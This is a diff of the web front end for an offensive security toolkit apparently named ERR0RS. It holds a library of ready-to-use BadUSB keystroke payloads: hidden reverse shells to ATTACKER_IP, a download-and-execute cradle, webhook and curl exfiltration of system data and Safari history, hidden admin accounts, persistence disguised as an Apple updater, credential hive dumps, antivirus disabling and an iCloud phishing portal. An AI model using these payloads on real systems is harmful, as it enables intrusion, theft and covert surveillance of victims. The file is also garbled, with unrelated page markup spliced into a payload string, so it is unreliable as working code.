+  const sessions = JSON.parse(localStorage.getItem('errz_sessions') || '[]');
+  const blob = new Blob([JSON.stringify(sessions, null, 2)], {type:'application/json'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = `errz_sessions_${Date.now()}.json`;
+  a.click();
+}
+
+function clearAllSessions() {
+  if (confirm('Clear all saved sessions?')) {
+    localStorage.removeItem('errz_sessions');
+    refreshSessionList();
+  }
+}
+</script>
+<script>
+// ═══════════════════════════════════════════════
+// PAYLOAD SNIPPET LIBRARY — 21 cards, 4 platforms
+// Source: src/tools/payload_studio/snippets.py
+// ═══════════════════════════════════════════════
+const SNIPPETS = {
+  windows: [
+    {
+      id: "badusb_win_ps_hidden",
+      title: "Hidden PowerShell Reverse Shell",
+      category: "shell",
+      difficulty: "Intermediate",
+      tags: ["powershell", "reverse shell", "windows", "hidden", "tcpclient"],
+      desc: "Opens hidden PowerShell via Win+R and connects back to attacker. No window visible.",
+      platform: "windows",
+      code: "REM Hidden PowerShell reverse shell via Win+R\nREM Replace ATTACKER_IP and PORT before deploying\nDELAY 1000\nGUI r\nDELAY 600\nSTRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=[Text.Encoding]::ASCII.GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r+[char]26);$s.Write($rb,0,$rb.Length)};$c.Close()\"\nENTER",
+    },
+    {
+      id: "badusb_win_open_cmd",
+      title: "Open Elevated CMD (UAC Bypass)",
+      category: "privesc",
+      difficulty: "Intermediate",
+      tags: ["cmd", "uac", "admin", "elevate", "windows"],
+      desc: "Opens elevated CMD prompt using Ctrl+Shift+Enter UAC bypass trick.",
+      platform: "windows",
+      code: "REM Open elevated CMD silently via UAC bypass\nDELAY 500\nGUI r\nDELAY 600\nSTRING cmd\nCTRL SHIFT ENTER\nDELAY 1200\nLEFTARROW\nENTER\nDELAY 1500",
+    },
+    {
+      id: "badusb_win_admin",
+      title: "Add Hidden Admin Account",
+      category: "persistence",
+      difficulty: "Beginner",
+      tags: ["net user", "admin", "account", "windows", "persistence"],
+      desc: "Creates a new local admin user. Replace username/password before use.",
+      platform: "windows",
+      code: "REM Add hidden admin account \u2014 replace USERNAME and PASSWORD\nDELAY 1000\nGUI r\nDELAY 600\nSTRING cmd /c net user USERNAME P@ssw0rd123 /add & net localgroup administrators USERNAME /add\nENTER",
+    },
+    {
+      id: "badusb_win_exfil_webhook",
+      title: "Exfil via Discord Webhook",
+      category: "exfil",
+      difficulty: "Intermediate",
+      tags: ["discord", "webhook", "exfil", "sysinfo", "powershell"],
+      desc: "Sends hostname, username, and IP info to a Discord webhook. Replace WEBHOOK_URL.",
+      platform: "windows",
+      code: "REM Exfil system info via Discord webhook\nREM Replace WEBHOOK_URL with real Discord webhook\nDELAY 500\nGUI r\nDELAY 600\nSTRING powershell -w hidden -c \"$d=@{username='ERR0RS';content=\"$env:COMPUTERNAME | $env:USERNAME | $(ipconfig|Select-String 'IPv4')\"};Invoke-RestMethod -Uri 'WEBHOOK_URL' -Method Post -Body ($d|ConvertTo-Json) -ContentType 'application/json'\"\nENTER",
+    },
+    {
+      id: "badusb_win_persistence_reg",
+      title: "Registry Run Key Persistence",
+      category: "persistence",
+      difficulty: "Intermediate",
+      tags: ["registry", "run key", "persistence", "startup", "windows"],
+      desc: "Adds a registry run key so a script executes every time the user logs in.",
+      platform: "windows",
+      code: "REM Registry Run Key persistence \u2014 edit path before use\nDELAY 1000\nGUI r\nDELAY 600\nSTRING powershell -w hidden -c \"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /t REG_SZ /d 'powershell -ep bypass -w hidden -f C:\\Users\\Public\\update.ps1' /f\"\nENTER",
+    },
+    {
+      id: "badusb_win_download_exec",
+      title: "Download & Execute Payload",
+      category: "shell",
+      difficulty: "Intermediate",
+      tags: ["download", "execute", "iex", "cradle", "powershell"],
+      desc: "Downloads and executes a remote PowerShell script. Classic IEX cradle. Replace ATTACKER_IP.",
+      platform: "windows",
+      code: "REM Download & Execute payload \u2014 replace ATTACKER_IP\nDELAY 1000\nGUI r\nDELAY 600\nSTRING powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')\"\nENTER",
+    },
+    {
+      id: "badusb_win_dump_loot",
+      title: "Dump SAM & SYSTEM Hives",
+      category: "credentials",
+      difficulty: "Advanced",
+      tags: ["sam", "system", "credentials", "hash", "dump"],
+      desc: "Saves SAM and SYSTEM registry hives for offline hash extraction with Impacket/Secretsdump.",
+      platform: "windows",
+      code: "REM Dump SAM + SYSTEM for offline hash extraction\nREM Requires admin \u2014 use 'Open Elevated CMD' snippet first\nDELAY 1000\nSTRING reg save hklm\\sam C:\\Windows\\Temp\\sam.bak\nENTER\nDELAY 800\nSTRING reg save hklm\\system C:\\Windows\\Temp\\sys.bak\nENTER\nDELAY 500\nSTRING echo Done. Retrieve: C:\\Windows\\Temp\\sam.bak and sys.bak\nENTER",
+    },
+    {
+      id: "badusb_win_disable_defender",
+      title: "Disable Windows Defender (PS)",
+      category: "evasion",
+      difficulty: "Advanced",
+      tags: ["defender", "antivirus", "disable", "evasion", "powershell"],
+      desc: "Disables Windows Defender real-time monitoring via PowerShell. Requires admin.",
+      platform: "windows",
+      code: "REM Disable Defender \u2014 requires admin PowerShell\nDELAY 1000\nSTRING Set-MpPreference -DisableRealtimeMonitoring $true\nENTER\nDELAY 500\nSTRING Set-MpPreference -DisableIOAVProtection $true\nENTER\nDELAY 500\nSTRING Set-MpPreference -DisableBehaviorMonitoring $true\nENTER",
+    },
+    {
+      id: "badusb_win_lockscreen",
+      title: "Lock Workstation",
+      category: "disruption",
+      difficulty: "Beginner",
+      tags: ["lock", "screen", "disrupt", "windows"],
+      desc: "Locks the Windows workstation immediately using Win+L shortcut.",
+      platform: "windows",
+      code: "REM Lock Windows workstation immediately\nDELAY 500\nGUI l",
+    },
+  ],
+  macos: [
+    {
+      id: "badusb_mac_rev_shell",
+      title: "macOS Bash Reverse Shell",
+      category: "shell",
+      difficulty: "Intermediate",
+      tags: ["bash", "reverse shell", "macos", "terminal", "spotlight"],
+      desc: "Opens Terminal via Spotlight and fires a bash reverse shell. Replace ATTACKER_IP.",
+      platform: "macos",
+      code: "REM macOS reverse shell via Spotlight \u2192 Terminal\nREM Replace ATTACKER_IP and PORT\nDELAY 500\nGUI SPACE\nDELAY 900\nSTRING terminal\nDELAY 700\nENTER\nDELAY 1500\nSTRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\nENTER",
+    },
+    {
+      id: "badusb_mac_exfil_sysinfo",
+      title: "Exfil macOS System Info",
+      category: "recon",
+      difficulty: "Intermediate",
+      tags: ["exfil", "sysinfo", "curl", "macos", "recon"],
+      desc: "Gathers hostname, user, IP, and sends to attacker via curl. Replace ATTACKER_IP.",
+      platform: "macos",
+      code: "REM Exfil macOS system info via HTTP POST\nREM Replace ATTACKER_IP\nDELAY 500\nGUI SPACE\nDELAY 900\nSTRING terminal\nDELAY 700\nENTER\nDELAY 1500\nSTRING curl -X POST http://ATTACKER_IP/loot -d \"host=$(hostname)&user=$(whoami)&ip=$(ipconfig getifaddr en0)\"\nENTER",
+    },
+    {
+      id: "badusb_mac_persistence",
+      title: "macOS LaunchAgent Persistence",
+      category: "persistence",
+      difficulty: "Advanced",
+      tags: ["launchagent", "persistence", "plist", "macos", "startup"],
+      desc: "Installs a LaunchAgent plist to auto-run a reverse shell on login. Replace ATTACKER_IP.",
+      platform: "macos",
+      code: "REM macOS LaunchAgent persistence \u2014 replace ATTACKER_IP\nDELAY 500\nGUI SPACE\nDELAY 900\nSTRING terminal\nDELAY 700\nENTER\nDELAY 1500\nSTRING cat > ~/Library/LaunchAgents/com.apple.update.plist << 'EOF'\nENTER\nSTRING <?xml version=\"1.0\" encoding=\"UTF-8\"?>\nENTER\nSTRING <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\nENTER\nSTRING <plist version=\"1.0\"><dict><key>Label</key><string>com.apple.update</string><key>ProgramArguments</key><array><string>bash</string><string>-c</string><string>bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1</string></array><key>RunAtLoad</key><true/></dict></plist>\nENTER\nSTRING EOF\nENTER\nDELAY 500\nSTRING launchctl load ~/Library/LaunchAgents/com.apple.update.plist\nENTER",
+    },
+    {
+      id: "badusb_mac_disable_gatekeeper",
+      title: "Disable Gatekeeper (macOS)",
+      category: "evasion",
+      difficulty: "Advanced",
+      tags: ["gatekeeper", "disable", "macos", "evasion", "spctl"],
+      desc: "Disables macOS Gatekeeper to allow unsigned apps. Requires password prompt.",
+      platform: "macos",
+      code: "REM Disable macOS Gatekeeper \u2014 requires admin password\nDELAY 500\nGUI SPACE\nDELAY 900\nSTRING terminal\nDELAY 700\nENTER\nDELAY 1500\nSTRING sudo spctl --master-disable\nENTER\nDELAY 2000\nREM Enter sudo password here if needed\nREM STRING your_password\nREM ENTER",
+    },
+    {
+      id: "badusb_mac_safari_history",
+      title: "Exfil Safari History",
+      category: "surveillance",
+      difficulty: "Intermediate",
+      tags: ["safari", "history", "exfil", "macos", "browser"],
+      desc: "Copies Safari browsing history database to /tmp for exfiltration. Replace ATTACKER_IP.",
+      platform: "macos",
+      code: "REM Exfil Safari history \u2014 replace ATTACKER_IP\nDELAY 500\nGUI SPACE\nDELAY 900\nSTRING terminal\nDELAY 700\nENTER\nDELAY 1500\nSTRING cp ~/Library/Safari/History.db /tmp/hist.db && curl -X POST http://ATTACKER_IP/loot -F 'file=@/tmp/hist.db'\nENTER",
+    },
+  ],
+  android: [
+    {
+      id: "badusb_android_rev_shell",
+      title: "Android ADB Reverse Shell",
+      category: "shell",
+      difficulty: "Advanced",
+      tags: ["adb", "android", "reverse shell", "shell", "usb debug"],
+      desc: "Sends an ADB shell command via HID if USB debugging is enabled. Replace ATTACKER_IP.",
+      platform: "android",
+      code: "REM Android ADB reverse shell\nREM Requires USB Debugging ENABLED on target device\nREM Replace ATTACKER_IP and PORT\nDELAY 2000\nSTRING adb shell am start --user 0 -a android.intent.action.VIEW\nENTER\nDELAY 1000\nSTRING adb shell bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &'\nENTER",
+    },
+    {
+      id: "badusb_android_exfil_contacts",
+      title: "Exfil Android Contacts (ADB)",
+      category: "exfil",
+      difficulty: "Advanced",
+      tags: ["contacts", "exfil", "adb", "android", "content provider"],
+      desc: "Dumps Android contacts database via ADB content provider query.",
+      platform: "android",
+      code: "REM Exfil Android contacts via ADB\nDELAY 1000\nSTRING adb shell content query --uri content://contacts/phones/ --projection display_name:number > /sdcard/contacts.txt\nENTER\nDELAY 1500\nSTRING adb pull /sdcard/contacts.txt ./contacts.txt\nENTER",
+    },
+    {
+      id: "badusb_android_lock",
+      title: "Lock Android Screen",
+      category: "disruption",
+      difficulty: "Beginner",
+      tags: ["lock", "screen", "android", "keyevent"],
+      desc: "Locks the Android screen using ADB keyevent (power button).",
+      platform: "android",
+      code: "REM Lock Android screen via ADB\nDELAY 500\nSTRING adb shell input keyevent 26\nENTER",
+    },
+    {
+      id: "badusb_android_sysinfo",
+      title: "Dump Android System Info",
+      category: "recon",
+      difficulty: "Beginner",
+      tags: ["sysinfo", "recon", "android", "adb", "device"],
+      desc: "Dumps Android device info, OS version, IMEI, and installed apps via ADB.",
+      platform: "android",
+      code: "REM Dump Android system info\nDELAY 500\nSTRING adb shell getprop ro.product.model && adb shell getprop ro.build.version.release && adb shell service call iphonesubinfo 1\nENTER\nDELAY 1000\nSTRING adb shell pm list packages -3\nENTER",
+    },
+  ],
+  ios: [
+    {
+      id: "ios_vector_overview",
+      title: "iOS Attack Vector Overview",
+      category: "utility",
+      difficulty: "Beginner",
+      tags: ["ios", "iphone", "attack surface", "overview", "evil portal"],
+      desc: "Reference card: iOS attack surface \u2014 Evil Portal, MDM profiles, Lightning cable attacks.",
+      platform: "ios",
+      code: "REM iOS ATTACK VECTOR OVERVIEW\nREM \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\nREM\nREM VECTOR 1: Evil Portal (WiFi Pineapple / Flipper + WiFi Board)\nREM   Target connects to rogue AP \u2192 captive portal prompts credentials\nREM   Tool: WiFi Pineapple PineAP module / Flipper WiFi dev board\nREM\nREM VECTOR 2: Malicious MDM Profile\nREM   Host a .mobileconfig file \u2192 tricks user into installing\nREM   Can install CA certs, VPN configs, force managed apps\nREM   Tool: iPhone Backup Analyzer / Apple Configurator\nREM\nREM VECTOR 3: O.MG Cable / Lightning HID\nREM   Looks like a real lightning cable, runs DuckyScript\nREM   Works while iOS is unlocked\nREM\nREM VECTOR 4: AirDrop Phishing\nREM   Broadcast malicious contact card or image\nREM   Works in open AirDrop mode\nREM \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\nREM No DuckyScript \u2014 reference note only",
+    },
+    {
+      id: "ios_evil_portal_template",
+      title: "Evil Portal \u2014 iOS iCloud Login",
+      category: "credentials",
+      difficulty: "Intermediate",
+      tags: ["evil portal", "ios", "icloud", "phishing", "captive portal"],
+      desc: "Evil Portal template that mimics an iCloud login page. Deploy via Flipper WiFi board.",
+      platform: "ios",
+      code: "REM Evil Portal \u2014 iCloud login phishing page\nREM Deploy HTML file to Flipper Zero WiFi dev board\nREM See: /evil_portal/ directory for full HTML template\nREM\nREM SETUP:\nREM 1. Copy portal HTML to Flipper SD: apps_data/evil_portal/index.html\nREM 2. Enable Evil Portal in Flipper WiFi app\nREM 3. Target iOS device connects to rogue AP\nREM 4. Captive portal shows fake iCloud login\nREM 5. Credentials saved to Flipper SD log\nREM\nREM TEMPLATE:\nREM <!DOCTYPE html><html><head><title>iCloud</title></head>\nREM <body><form action='/save' method='post'>\nREM <input name='user' placeholder='Apple ID'>\nREM <input name='pass' type='password' placeholder='Password'>\nREM <button type='submit'>Sign In</button></form>
+<!-- ══ SKILL PANEL TOGGLE ════════════════════════════════════════════════ -->
+<div id="skill-toggle" onclick="toggleSkillPanel()" title="Operator Skills & XP">XP</div>
+
+<!-- ══ SKILL PANEL ════════════════════════════════════════════════════════ -->
+<div id="skill-panel">
+  <div class="sp-header">OPERATOR PROFILE</div>
+  <div class="sp-level-badge">
+    <div class="sp-badge-icon" id="sp-badge">🔰</div>
+    <div class="sp-level-info">
+      <div class="sp-level-name" id="sp-level-name">LOADING...</div>
+      <div class="sp-xp-line" id="sp-xp-line">0 XP • 0 to next</div>
+      <div class="sp-xp-bar-wrap">
+        <div class="sp-xp-bar" id="sp-xp-bar" style="width:0%"></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="sp-header" style="margin-top:4px">SKILL DOMAINS</div>
+  <div id="sp-domains"></div>
+
+  <div class="sp-header" style="margin-top:4px">STATS</div>
+  <div id="sp-stats"></div>
+
+  <div class="sp-header" style="margin-top:4px">QUICK COACH</div>
+  <div style="font-size:11px;color:#888;line-height:1.6;padding:6px 0">
+    Ask ERR0RS anything in the terminal below. Type a question naturally — no commands needed.<br><br>
+    Examples:<br>
+    <span style="color:#a855f7">• explain sql injection</span><br>
+    <span style="color:#a855f7">• walk me through kerberoasting</span><br>
+    <span style="color:#a855f7">• what is CIS Control 5</span><br>
+    <span style="color:#a855f7">• how do I read nmap output</span>
+  </div>
+</div>
+
+<!-- ══ ONBOARDING OVERLAY ════════════════════════════════════════════════ -->
+<div id="onboarding-overlay" class="hidden">
+  <div class="ob-card">
+    <div class="ob-logo">🐱‍💻</div>
+    <div class="ob-steps" id="ob-steps">
+      <div class="ob-step active" id="ob-step-0"></div>
+      <div class="ob-step" id="ob-step-1"></div>
+      <div class="ob-step" id="ob-step-2"></div>
+      <div class="ob-step" id="ob-step-3"></div>
+    </div>
+    <div id="ob-screen-content"></div>
+  </div>
+</div>
+
+<!-- ══ MISSION COACH ══════════════════════════════════════════════════════ -->
+<div id="mission-coach">
+  <div class="mc-icon">🎯</div>
+  <div class="mc-content">
+    <div class="mc-title" id="mc-title">MISSION GUIDANCE</div>
+    <div class="mc-text" id="mc-text"></div>
+  </div>
+  <div class="mc-close" onclick="document.getElementById('mission-coach').classList.remove('visible')">✕</div>
+</div>
+
+<script src="progression_ui.js"></script>
+
+<!-- ══ AGENT TRIGGER ═════════════════════════════════════════════════════ -->
+<div id="agent-trigger" onclick="toggleAgentPanel()" title="Autonomous Agent">🤖</div>
+
+<!-- ══ AGENT PANEL ═══════════════════════════════════════════════════════ -->
+<div id="agent-panel">
+  <div class="ag-header">🤖 AUTONOMOUS AGENT</div>
+
+  <div class="ag-status">
+    <div class="ag-dot" id="ag-dot"></div>
+    <div id="ag-status-text">IDLE — Ready to engage</div>
+  </div>
+
+  <div class="ag-header" style="margin-top:4px">TARGET</div>
+  <input class="ag-input" id="ag-target" placeholder="192.168.1.100 or http://target.com"
+    value="" />
+
+  <div class="ag-header">GOAL</div>
+  <select class="ag-select" id="ag-goal">
+    <option value="full_chain">Full Chain — recon → exploitation</option>
+    <option value="web">Web App — full web assessment</option>
+    <option value="network">Network — port scan + service enum</option>
+    <option value="quick">Quick — fast surface scan</option>
+    <option value="stealth">Stealth — low-noise recon</option>
+    <option value="ad">Active Directory — path to DA</option>
+  </select>
+
+  <button class="ag-btn" id="ag-launch-btn" onclick="launchAgent()">
+    ⚡ LAUNCH AGENT
+  </button>
+  <button class="ag-btn stop" id="ag-stop-btn" onclick="stopAgent()" style="display:none">
+    ⏹ STOP AGENT
+  </button>
+
+  <div class="ag-header" style="margin-top:4px">LIVE STATUS</div>
+  <div class="ag-stat"><span>Phase</span><span class="ag-phase" id="ag-phase">—</span></div>
+  <div class="ag-stat"><span>Steps</span><span class="ag-stat-val" id="ag-steps">0</span></div>
+  <div class="ag-stat"><span>Findings</span><span class="ag-stat-val" id="ag-findings">0</span></div>
+  <div class="ag-stat"><span>Open Ports</span><span class="ag-stat-val" id="ag-ports">—</span></div>
+  <div class="ag-stat"><span>Vulns</span><span class="ag-stat-val" id="ag-vulns">0</span></div>
+  <div class="ag-stat"><span>Creds</span><span class="ag-stat-val" id="ag-creds">0</span></div>
+
+  <div class="ag-header" style="margin-top:4px">QUICK LAUNCH</div>
+  <div style="font-size:10px;color:#888;line-height:1.8">
+    Type in terminal:<br>
+    <span style="color:#a855f7">agent 10.0.0.1</span><br>
+    <span style="color:#a855f7">agent http://target web</span><br>
+    <span style="color:#a855f7">agent 192.168.1.0/24 network</span><br>
+    <span style="color:#a855f7">stop agent</span>
+  </div>
+</div>
+
+</body></html>",
+    },
+    {
+      id: "ios_mdm_profile_note",
+      title: "Malicious MDM Profile Reference",
+      category: "surveillance",
+      difficulty: "Advanced",
+      tags: ["mdm", "mobileconfig", "ios", "profile", "surveillance"],
+      desc: "Reference for creating malicious .mobileconfig MDM profiles. Install via AirDrop or web link.",
+      platform: "ios",
+      code: "REM MDM PROFILE ATTACK \u2014 reference only, no DuckyScript\nREM\nREM .mobileconfig files can:\nREM   - Install attacker CA certificates (MITM HTTPS)\nREM   - Configure VPN to route traffic through attacker\nREM   - Restrict device settings\nREM   - Install managed apps silently\nREM\nREM DELIVERY:\nREM   - Host .mobileconfig at http://ATTACKER_IP/profile.mobileconfig\nREM   - Send link via Evil Portal, AirDrop, iMessage\nREM   - iOS prompts: 'Do you want to install this profile?'\nREM\nREM CREATION TOOL:\nREM   Apple Configurator 2 (Mac App Store, free)\nREM   iphone-backup-analyzer for inspection",
+    },
+  ],
+};
+</script>
+
+<!-- ═══════════════════════════════════════════════════════════════
+     TERMINAL BRIDGE — Tool Panel overlay
+     Slides in from the right when a tool card is activated.
+     Contains: tool description, clickable flags, command preview, FIRE button.
+════════════════════════════════════════════════════════════════════ -->
+<div id="errz-panel-overlay" style="
+  display:none;
+  position:fixed;top:0;right:0;bottom:0;
+  width:420px;max-width:95vw;
+  background:#08001a;
+  border-left:1px solid #2d0a60;
+  z-index:9000;
+  overflow-y:auto;
+  padding:20px;
+  box-shadow:-8px 0 32px rgba(123,47,190,0.25);
+  transition:transform 0.25s ease;
+  font-family:'Share Tech Mono',monospace;
+">
+  <!-- Panel header bar -->
+  <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;border-bottom:1px solid #1e0040;padding-bottom:12px;">
+    <span style="font-family:Orbitron,monospace;color:#bf6fff;font-size:0.85rem;letter-spacing:2px;">
+      ⚡ TOOL ANATOMY
+    </span>
+    <button onclick="ToolPanel.hide();document.getElementById('errz-panel-overlay').style.display='none';"
+      style="background:none;border:none;color:#4a2870;cursor:pointer;font-size:20px;line-height:1;">✕</button>
+  </div>
+
+  <!-- Target input inside panel -->
+  <div style="margin-bottom:14px;">
+    <div style="color:#4a2870;font-size:11px;margin-bottom:4px;">TARGET</div>
+    <input id="errz-panel-target" type="text" placeholder="192.168.1.1 or hostname.com"
+      style="
+        width:100%;padding:8px 12px;
+        background:#04000a;border:1px solid #1e0040;border-radius:4px;
+        color:#d4b8ff;font-family:'Share Tech Mono',monospace;font-size:13px;
+        outline:none;
+      "
+      oninput="errzPanelTargetChanged(this.value)"
+    />
+  </div>
+
+  <!-- Panel content injected by tool_panel.js -->
+  <div id="errz-tool-panel-wrap"></div>
+</div>
+
+<!-- Dark backdrop -->
+<div id="errz-panel-backdrop" onclick="ToolPanel.hide();document.getElementById('errz-panel-overlay').style.display='none';document.getElementById('errz-panel-backdrop').style.display='none';"
+  style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.55);z-index:8999;">
+</div>
+
+<!-- Tool Panel JS -->
+<script src="/tool_panel.js"></script>
+<script>
+  // ── Init ToolPanel on page load ───────────────────────────────────────────
+  document.addEventListener("DOMContentLoaded", () => {
+    ToolPanel.init("errz-tool-panel-wrap");
+  });
+
+  // ── openToolPanel — called by right-click on tool cards ──────────────────
+  // Also called directly for left-click on registry-enabled cards
+  function openToolPanel(tool, target) {
+    target = target
+          || document.getElementById("errz-panel-target")?.value?.trim()
+          || "";
+
+    // Update the target input inside the panel
+    const inp = document.getElementById("errz-panel-target");
+    if (inp) inp.value = target;
+
+    // ERR0RS visual reaction
+    if (typeof bgImg      !== "undefined") bgImg.className = "lean-right";
+    if (typeof zoomBorder !== "undefined") {
+      zoomBorder.classList.add("speaking");
+      setTimeout(() => zoomBorder.classList.remove("speaking"), 1200);
+    }
+    if (typeof speechEl !== "undefined") {
+      speechEl.style.opacity = 0;
+      setTimeout(() => {
+        speechEl.textContent = `📖 ${tool.toUpperCase()} anatomy panel — learn every flag.`;
+        speechEl.style.opacity = 1;
+      }, 200);
+    }
+
+    addIntel("🔍 TOOL PANEL", `Loading ${tool.toUpperCase()} anatomy...`, "info");
+
+    // ToolPanel.show() is called internally by loadPanel() after data arrives
+    ToolPanel.loadPanel(tool, target);
+  }
+
+  // ── Target input inside the panel wires into ToolPanel state ─────────────
+  // Uses the getter exposed in the v2.0 public API
+  function errzPanelTargetChanged(val) {
+    ToolPanel._updateTarget(val);
+  }
+
+
+
+// ══ ERR0RS AUTO COACH RENDERER ═══════════════════════════════════════════════
+function renderCoachBlock(result, rawText, tool) {
+  const ltp = document.getElementById('live-term-output');
+  if (!ltp) return;
+
+  const sev = result.severity || 'info';
+  const sevColors = {
+    critical: '#ef4444', high: '#f59e0b', medium: '#a855f7',
+    low: '#22d3ee', info: '#888'
+  };
+  const sevIcons = { critical:'🔴', high:'🟠', medium:'🟡', low:'🔵', info:'⚪' };
+  const color = sevColors[sev] || '#888';
+  const icon  = sevIcons[sev]  || '⚪';
+
+  const el = document.createElement('div');
+  el.className = 'err0rs-coach-block';
+  el.style.cssText = `
+    background: linear-gradient(135deg, #0a0012 0%, #0d001a 100%);
+    border: 1px solid ${color}55;
+    border-left: 3px solid ${color};
+    border-radius: 0 8px 8px 8px;
+    margin: 14px 4px 10px 4px;
+    padding: 14px 16px 12px 16px;
+    font-family: 'Segoe UI', 'Inter', system-ui, sans-serif;
+    animation: coachSlideIn 0.3s ease;
+  `;
+
+  const steps = (result.next_steps || []).map((s, i) => `
+    <div style="margin:6px 0;display:flex;gap:8px;align-items:flex-start">
+      <span style="color:${color};font-weight:700;min-width:16px">${i+1}.</span>
+      <div>
+        <div style="font-size:11px;color:#a855f7;font-weight:700">${s.label}</div>
+        <code style="font-size:11px;color:#22d3ee;background:#0d0018;padding:2px 6px;border-radius:3px;display:block;margin-top:2px;cursor:pointer"
+          onclick="document.querySelector('#ltp-input')?.focus(); document.querySelector('#ltp-input').value = '${s.command.replace(/'/g,"\'")}'"
+          title="Click to paste command">
+          $ ${s.command}
+        </code>
+      </div>
+    </div>
+  `).join('');
+
+  const defenseHtml = result.defense ? `
+    <div style="margin-top:10px;padding:8px 10px;background:#000a00;border-radius:4px;border:1px solid #22c55e33">
+      <span style="font-size:10px;font-weight:700;color:#22c55e">🛡️ DEFENSE</span>
+      <div style="font-size:11px;color:#86efac;margin-top:4px">${result.defense}</div>
+    </div>
+  ` : '';
+
+  el.innerHTML = `
+    <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px">
+      <span style="font-size:18px">${icon}</span>
+      <div>
+        <div style="font-size:11px;font-weight:700;letter-spacing:0.1em;color:${color}">
+          ERR0RS ANALYSIS — ${result.heading || 'TOOL COMPLETE'}
+        </div>
+        <div style="font-size:10px;color:#666;margin-top:1px">
+          SEVERITY: <span style="color:${color}">${sev.toUpperCase()}</span>
+          ${result.finding_count > 1 ? ` · ${result.finding_count} findings` : ''}
+        </div>
+      </div>
+    </div>
+    ${result.explain ? `
+      <div style="font-size:12px;color:#d8b4fe;line-height:1.7;margin-bottom:10px;padding-bottom:10px;border-bottom:1px solid ${color}22">
+        ${result.explain}
+      </div>
+    ` : ''}
+    ${steps ? `
+      <div style="font-size:11px;font-weight:700;color:${color};margin-bottom:6px;letter-spacing:0.08em">
+        ⚡ NEXT STEPS — click any command to paste:
+      </div>
+      ${steps}
+    ` : ''}
+    ${defenseHtml}
+  `;
+
+  ltp.appendChild(el);
+  ltp.scrollTop = ltp.scrollHeight;
+
+  // Show XP toast if applicable
+  if (result.xp_event) {
+    fetch('/api/progression/award', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({event: result.xp_event, context: result.heading || ''})
+    }).then(r => r.json()).then(d => {
+      if (typeof showXPToast !== 'undefined') showXPToast(d.xp_gained || 50, d.level_up || false, (d.new_level || {}).name || '');
+    }).catch(() => {});
+  }
+
+  // Push to intel feed
+  addIntel(`${icon} ${tool.toUpperCase()} ANALYSIS`, result.heading || 'Complete', sev === 'critical' || sev === 'high' ? 'error' : 'info');
+}
+
+// Add coach slide-in animation
+if (!document.getElementById('coach-anim-style')) {
+  const s = document.createElement('style');
+  s.id = 'coach-anim-style';
+  s.textContent = '@keyframes coachSlideIn { from { opacity:0; transform:translateY(8px); } to { opacity:1; transform:translateY(0); } }';
+  document.head.appendChild(s);
+}
+// ════════════════════════════════════════════════════════════════════════════
+
+// ══ ERR0RS CHAT ENGINE ═══════════════════════════════════════════════════════
+// Renders streaming LLM responses in the live terminal panel as chat bubbles
+
+let _chatBubble = null;         // currently streaming bubble element
+let _chatBuffer  = '';          // accumulated text for markdown render
+
+function appendChatToken(token) {
+  // Create bubble on first token
+  if (!_chatBubble) {
+    _chatBubble = document.createElement('div');
+    _chatBubble.className = 'err0rs-chat-bubble';
+    _chatBubble.innerHTML =
+      '<span class="chat-label">🧠 ERR0RS</span>' +
+      '<div class="chat-body" id="err0rs-chat-body-active"></div>';
+    const ltp = document.getElementById('live-term-output');
+    if (ltp) ltp.appendChild(_chatBubble);
+    _chatBuffer = '';
+  }
+  _chatBuffer += token;
+  const body = _chatBubble.querySelector('.chat-body');
+  if (body) body.innerHTML = renderChatMarkdown(_chatBuffer) + '<span class="chat-cursor">▌</span>';
+  // Auto-scroll
+  const ltp = document.getElementById('live-term-output');
+  if (ltp) ltp.scrollTop = ltp.scrollHeight;
+}
+
+function finalizeChatBubble() {
+  if (!_chatBubble) return;
+  const body = _chatBubble.querySelector('.chat-body');
+  const finalText = _chatBuffer;
+  if (body) body.innerHTML = renderChatMarkdown(finalText);
+  _chatBubble = null;
+  _chatBuffer  = '';
+  // Push preview to intel feed
+  const preview = finalText.replace(/<[^>]+>/g,'').substring(0, 100);
+  addIntel('🧠 ERR0RS', preview || 'Response complete', 'info');
+  ltpScrollBottom();
+  // Award XP for conversation (non-blocking)
+  fetch('/api/progression/award', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({event: 'ask_question', context: preview})
+  }).then(r => r.json()).then(d => {
+    if (typeof showXPToast !== 'undefined') showXPToast(d.xp_gained || 5, d.level_up || false, (d.new_level || {}).name || '');
+  }).catch(() => {});
+}
+
+function renderChatMarkdown(md) {
+  // Lightweight markdown renderer for chat bubbles
+  let html = md
+    // Escape HTML first
+    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+    // Code blocks (```lang ... ```)
+    .replace(/```(\w*)
+?([\s\S]*?)```/g, (_, lang, code) =>
